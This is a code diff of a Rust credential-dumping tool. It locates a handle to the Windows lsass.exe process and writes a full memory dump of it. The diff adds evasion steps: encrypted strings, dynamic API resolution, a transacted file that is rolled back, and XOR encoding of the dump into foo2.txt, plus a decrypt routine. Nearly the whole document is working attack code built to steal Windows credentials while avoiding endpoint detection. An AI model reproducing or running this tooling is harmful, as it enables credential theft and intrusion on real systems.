@@ -6,9 +6,9 @@ use_litcrypt!();
 
 use litcrypt::lc;
 use core::panic;
-use std::{mem::{size_of}, ptr};
-use bindings::Windows::Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{CreateFileA, GENERIC_ALL, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PVOID, QueryFullProcessImageNameW, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO};
+use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
+use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
+use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransactio, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile};
 
 
 // #[no_mangle]
@@ -30,7 +30,7 @@ pub fn dump() {
         }
         else 
         {
-            println!("{}", &lc!("[-] SeDebugPrivilege successfully enabled."));
+            println!("{}", &lc!("[+] SeDebugPrivilege successfully enabled."));
         }
 
         let shi: *mut SYSTEM_HANDLE_INFORMATION;
@@ -72,7 +72,7 @@ pub fn dump() {
             }
         }     
         
-        println!("{}{}{}",&lc!("[-] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
+        println!("{}{}{}",&lc!("[+] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
         let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
         for x in 0..(*shi).number_of_handles 
         {
@@ -254,71 +254,247 @@ pub fn dump() {
 
                         // We have a valid process handled
                         if image_name.contains(&lc!("lsass.exe"))
-                        {
-                            let reti: Option<HANDLE>;
-                            let mut dump ="f\0o\0o\0.\0d\0m\0p\0\0\0".to_string(); // This is the format expected by CreateFileW, each char followed by a null byte.
-                            let dump_name = dump.as_mut_ptr();
-                            let create_file: CreateFileA;
-                            let desired_access = GENERIC_ALL;
-                            let share_mode = 1u32 | 2u32;
-                            let disposition = 2u32;
-                            let attr: *const SECURITY_ATTRIBUTES = ptr::null();
-                            let flags = 0x80; //FILE_ATTRIBUTE_NORMAL
-                            let template = HANDLE{0: -1 as isize}; // Null HANDLE
-
-                            // We create the file that will receive the dump
+                        {                         
+                            let ktmv = dinvoke::load_library_a(&lc!("KtmW32.dll")).unwrap();
+                            let func: CreateTransaction;
+                            let ret: Option<HANDLE>;
+                            let description = "\0\0".as_ptr() as *mut u16;
                             dinvoke::dynamic_invoke!(
-                                kernel32,
-                                &lc!("CreateFileW"),
-                                create_file,
-                                reti,
-                                dump_name,
-                                desired_access,
-                                share_mode,
-                                attr,
-                                disposition,
-                                flags,
-                                template
+                                ktmv,
+                                &lc!("CreateTransaction"),
+                                func,
+                                ret,
+                                ptr::null_mut(),
+                                ptr::null_mut(),
+                                0,
+                                0,
+                                0,
+                                0,
+                                description
                             );
 
-                            let file_handle;
-                            match  reti{
-                                Some(z) => file_handle = z,
-                                None => { panic!("{}", &lc!("[x] Error creating the dump file.")); },
-                            };
-                            
-                            if file_handle.0 != -1
-                            {        
-                                let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
-                      
-                                let func: MiniDumpWriteDump;
-                                let ret: Option<i32>;
-                                // We use the duplicated handle to dump the process memory
+                            let transaction_handle: HANDLE;
+
+                            match ret {
+                                Some(z) =>
+                                    if z.0 == -1 
+                                    {
+                                        shtei = shtei.add(1);
+                                        continue;
+                                    }
+                                    else
+                                    {
+                                        transaction_handle = z;
+                                    }
+                                None => {shtei = shtei.add(1); continue;},
+                            }
+
+                           /* if transaction_handle.0 == -1
+                            {
+                                let func: GetLastError;
+                                let ret: Option<u32>;
                                 dinvoke::dynamic_invoke!(
-                                    dbg,
-                                    &lc!("MiniDumpWriteDump"),
+                                    kernel32,
+                                    &lc!("GetLastError"),
                                     func,
                                     ret,
-                                    *dup_handle,
-                                    0, // Process Id does not seem to be needed 
-                                    file_handle,
-                                    0x00000002, // MiniDumpWithFullMemory
-                                    ptr::null_mut(),
-                                    ptr::null_mut(),
-                                    ptr::null_mut()
                                 );
 
-                                match ret {
-                                    Some(x) => 
-                                        if x == 1 
-                                        {
-                                            println!("{}",&lc!("[!] Lsass dump successfully created!")); 
-                                            let _r = dinvoke::close_handle(file_handle).unwrap();
-                                            break;
-                                        },
-                                    None => {},
-                                }
+                                println!("Error: {}", ret.unwrap());
+                                break;
+                            }*/
+
+                            let func: CreateFileTransactedA;
+                            let ret: Option<HANDLE>;
+                            let mini: *const u32 = std::mem::transmute(&0xffff);
+                            let s = format!(".\\test{}.log",rand::random::<char>());
+                            let file_name = s.as_ptr() as *mut u8;
+                            dinvoke::dynamic_invoke!(
+                                kernel32,
+                                &lc!("CreateFileTransactedW"),
+                                func,
+                                ret,
+                                file_name,
+                                0x80000000 | 0x40000000,
+                                0x00000002,
+                                ptr::null(),
+                                0x00000001, 
+                                0x100 | 0x04000000,
+                                HANDLE::default(),
+                                transaction_handle,
+                                mini,
+                                ptr::null_mut()
+                            );
+
+                            let transacted_file_handle: HANDLE;
+
+                            match ret {
+                                Some(z) =>
+                                    if z.0 == -1 
+                                    {
+                                        shtei = shtei.add(1);
+                                        continue;
+                                    }
+                                    else
+                                    {
+                                        transacted_file_handle = z;
+                                    }
+                                None => {shtei = shtei.add(1); continue;},
                             }
+
+                            /*if transacted_file.0 == -1
+                            {
+                                let f: GetLastError;
+                                let r: Option<u32>;
+                                dinvoke::dynamic_invoke!(
+                                    kernel32,
+                                    "GetLastError",
+                                    f,
+                                    r,
+                                );
+
+                                println!("Error: {}", r.unwrap());
+                                break;
+                            }*/
+
+                            let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
+                            let func: MiniDumpWriteDump;
+                            let ret: Option<i32>;
+                            // We use the duplicated handle to dump the process memory
+                            dinvoke::dynamic_invoke!(
+                                dbg,
+                                &lc!("MiniDumpWriteDump"),
+                                func,
+                                ret,
+                                *dup_handle,
+                                0, // Process Id does not seem to be needed 
+                                transacted_file_handle,
+                                0x00000002, // MiniDumpWithFullMemory
+                                ptr::null_mut(),
+                                ptr::null_mut(),
+                                ptr::null_mut()
+                            );
+
+                            match ret {
+                                Some(x) => 
+                                    if x == 1 
+                                    {
+                                        println!("{}",&lc!("[!] Lsass dump successfully created!"));
+                                        
+                                        let func: GetFileSize;
+                                        let ret: Option<u32>;
+                                        dinvoke::dynamic_invoke!(
+                                            kernel32,
+                                            &lc!("GetFileSize"),
+                                            func,
+                                            ret,
+                                            transacted_file_handle,
+                                            ptr::null_mut()
+                                        );
+
+                                        let dump_size = ret.unwrap();
+
+                                        let func: CreateFileMapping;
+                                        let ret: Option<HANDLE>;
+                                        dinvoke::dynamic_invoke!(
+                                            kernel32,
+                                            &lc!("CreateFileMappingW"),
+                                            func,
+                                            ret,
+                                            transacted_file_handle,
+                                            ptr::null(),
+                                            PAGE_READONLY,
+                                            0,
+                                            0,
+                                            ptr::null_mut()
+                                        );
+
+
+                                        let map_handle: HANDLE;
+
+                                        match ret {
+                                            Some(z) =>
+                                                if z.0 == -1 
+                                                {
+                                                    shtei = shtei.add(1);
+                                                    continue;
+                                                }
+                                                else
+                                                {
+                                                    map_handle = z;
+                                                }
+                                            None => {shtei = shtei.add(1); continue;},
+                                        }
+
+                                        let func: MapViewOfFile; 
+                                        let ret: Option<PVOID>;
+
+                                        dinvoke::dynamic_invoke!(
+                                            kernel32,
+                                            &lc!("MapViewOfFile"),
+                                            func,
+                                            ret,
+                                            map_handle,
+                                            4, // FILE_MAP_READ
+                                            0,
+                                            0,
+                                            0
+                                        );
+
+                                        let mut view_ptr = ret.unwrap() as *mut u8;
+                                        let key: u8 = 'p' as u8;
+                                        let mut view_xor: Vec<u8> = vec![];
+                                        for _i in 0..dump_size
+                                        {
+                                            view_xor.push(*view_ptr ^ key);
+                                            view_ptr = view_ptr.add(1);
+                                        }
+
+                                        let mut file = std::fs::File::create(&lc!("foo2.txt")).unwrap();
+                                        let _r = file.write(&view_xor).unwrap();
+
+                                        let func: UnmapViewOfFile;
+                                        let ret2: Option<BOOL>;
+                                        dinvoke::dynamic_invoke!(
+                                            kernel32,
+                                            &lc!("UnmapViewOfFile"),
+                                            func,
+                                            ret2,
+                                            ret.unwrap()
+                                        );
+
+                                        if ret2.unwrap().as_bool() == true
+                                        {
+                                            println!("{}", &lc!("[+] Successfully unmapped view of file."));
+                                        }
+
+
+                                        let func: RollbackTransactio;
+                                        let ret: Option<BOOL>;
+                                        dinvoke::dynamic_invoke!(
+                                            ktmv,
+                                            &lc!("RollbackTransaction"),
+                                            func,
+                                            ret,
+                                            transaction_handle
+                                        );
+
+                                        if ret.unwrap().as_bool() == true 
+                                        {
+                                            println!("{}",&lc!("[+] Transaction successfully rollbacked."));
+                                        }
+
+                                        let _r = dinvoke::close_handle(*dup_handle).unwrap();
+                                       // let _r = dinvoke::close_handle(file_handle).unwrap();
+                                        let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
+                                        let _r = dinvoke::close_handle(map_handle).unwrap();
+                                        let _r = dinvoke::close_handle(transaction_handle).unwrap();
+
+                                        break;
+                                    },
+                                None => {},
+                            }
+                            
 
                         }
                     }
@@ -333,4 +509,30 @@ pub fn dump() {
             }
         }            
     }
+}
+
+
+pub fn decrypt () 
+{
+    let mut f = File::open("foo2.txt").unwrap();
+    let metadata = fs::metadata("foo2.txt").expect("unable to read metadata");
+    let mut buffer = vec![];
+    f.read_to_end(&mut buffer).expect("buffer overflow");
+
+
+    let mut dir = buffer.as_ptr();
+    //let vv: Vec<u8> = Vec::from_raw_parts(dir, size as usize, size as usize);
+    let c: u8 = 'p' as u8;
+    let mut vv2: Vec<u8> = vec![];
+    unsafe{
+        for _i in 0..metadata.len()
+        {
+            vv2.push(*dir ^ c);
+            dir = dir.add(1);
+        }
+
+    let mut f2 = std::fs::File::create("foo3.txt").unwrap();
+    let _rr = f2.write_all(&vv2).unwrap();
+    }
+
 }
